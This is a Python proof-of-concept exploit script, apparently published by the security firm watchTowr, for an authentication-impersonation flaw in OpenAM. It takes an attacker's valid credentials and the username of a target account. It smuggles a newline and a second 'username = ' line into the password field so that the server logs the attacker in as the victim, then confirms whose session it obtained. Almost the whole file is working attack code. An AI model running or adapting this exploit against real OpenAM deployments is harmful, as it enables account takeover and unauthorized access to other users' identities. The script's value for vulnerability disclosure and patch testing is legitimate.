#################################################################
#                  __         ___  ___________
# __  _  ______ _/  |_  ____ |  |_\__    ____\____  _  ________
# \ \/ \/ \__  \\   ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
#  \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
#   \/\_/ (____  |__|  \___  |___|  |____| \____/ \/\_/  |__|   
#              \/          \/     \/                            
#
# Name: watchtowr-vs-openam_auth-impersonation_2022-06-16.py
# Author: Aliz Hammond
#################################################################

import json
import re
import textwrap

import httplib2
import argparse

def main():
	helpText = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  \n
		  PoC for CVE <todo> in OpenAM.
		  Specify a valid login using --username and --password, and the user you want to 
		  log in as using --victim. Specify --server if you're not logging in to login.example.com
		  or any of the other options as appropriate.
		  
		  - Aliz Hammond, watchTowr (aliz@watchTowr.com)
			 """

	# Parse the commandline and put the result some locals so that pycharm can pick it up
	parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
									 epilog=helpText)
	parser.add_argument("--verbose", required=False, default=False, action="store_true")
	parser.add_argument("--username", type=str, help="Valid username to authenticate as", required=True)
	parser.add_argument("--password", type=str, help="Valid password for user specified by --username", required=True)
	parser.add_argument("--victim", type=str, help="Username of target (victim) account", required=True)
	parser.add_argument("--server", type=str, help="Server name", default="login.example.com")
	parser.add_argument("--realm", type=str, help="Realm (usually 'root')", default="root")
	parser.add_argument("--port", type=str, help="Port to connect to", default="8080")
	parser.add_argument("--https", help="Use HTTPS instead of HTTP", required=False, default=False, action="store_true")
	parser.add_argument("--url", help="Override authentication URL", required=False, default=None)
	try:
		args = parser.parse_args()
	except:
		print(helpText)
		raise

	verbose = args.verbose
	attackerUsername = args.username
	attackerPassword = args.password
	victimUsername = args.victim
	server = args.server
	port = args.port
	realm = args.realm
	useHttps = args.https

	if args.url:
		loginurl = args.url
	else:
		loginurl = f"{'https' if useHttps else 'http'}://{server}:{port}/openam/json/realms/{realm}/authenticate"

	if verbose:
		print(f"Connecting to server, using URL {loginurl}")

	# If we're using HTTPS, we'll disable ssl cert verification.
	h = httplib2.Http(".cache", disable_ssl_certificate_validation=True)

	# POST so we get a session ID
	if verbose:
		print("Fetching session ID..")
	resp, content = h.request(loginurl, method="POST", headers={'Content-type': 'application/x-www-form-urlencoded'})
	# Extract that session ID
	contentJson = json.loads(content)
	if verbose:
		print(f"Received JSON data:\n{contentJson}")
	token = contentJson['authId']
	if verbose:
		print(f"Found session ID: '{token}'")
	# Also pull this token out of the cookie, we'll use it later to check the user ID after we log in.
	cookies = resp['set-cookie']
	m = re.match(".*AMAuthCookie=(.+?);.*", cookies)
	if m is None:
		raise Exception("Couldn't parse AMAuthCookie from auth request")
	amAuthToken = m.groups()[0]

	# Assemble the payload itself, containing a valid password, newline, and then 'password = ' and the valid password.
	passwordWithInjectedPayload = f"{attackerPassword}\nusername = {attackerUsername}"

	# Now we can submit our payload.
	postData = {
		'authId': token,
		"callbacks":
			[
				{
					"type": "NameCallback",
					"output": [{"name": "prompt", "value": "User Name:"}],
					"input": [{"name": "IDToken1", "value": victimUsername}]
				},
				{
					"type": "PasswordCallback",
					"output": [{"name": "prompt", "value": "Password:"}],
					"input": [{"name": "IDToken2", "value": passwordWithInjectedPayload}]
				}
			]
	}

	dataJson = json.dumps(postData)
	if verbose:
		print(f"Sending JSON data:\n{dataJson}")
	resp, content = h.request(loginurl, method="POST", body=dataJson, headers={'Content-type': 'application/json'})

	if verbose:
		print(f"Server responded with HTTP status code {resp['status']}")
		print("Response body:")
		print(content)

	if resp['status'] == '200':
		print("Successfully logged in. Checking user..")
	elif resp['status'] == '401':
		raise Exception("Server rejected our login. Either attacker username/password are incorrect, or server is patched.")
	else:
		raise Exception(f"Unexpected response status {resp['status']} : {content}")

	# Now check who we are logged in as.
	userIdURL = f"{'https' if useHttps else 'http'}://{server}:{port}/openam/json/realms/{realm}/users?_action=idFromSession"
	resp, content = h.request(userIdURL, method="POST", headers={'Content-type': 'application/json', 'Cookie': 'iPlanetDirectoryPro=' + amAuthToken})
	if resp['status'] != '200':
		print("Failed to check currently logged-in user")
	contentDecoded = json.loads(content)
	print(f"Successfully logged in as user {contentDecoded['id']}")

	if contentDecoded['id'] == victimUsername:
		print("PoC was able to log in as victim user successfully. The server is vulnerable.")
	elif contentDecoded['id'] == attackerUsername:
		print("Server logged in attacker, not the victim. The server is *NOT* vulnerable.")
	else:
		raise Exception(f"User {contentDecoded['id']} was logged in, but expected {attackerUsername} or {attackerPassword}")

main()
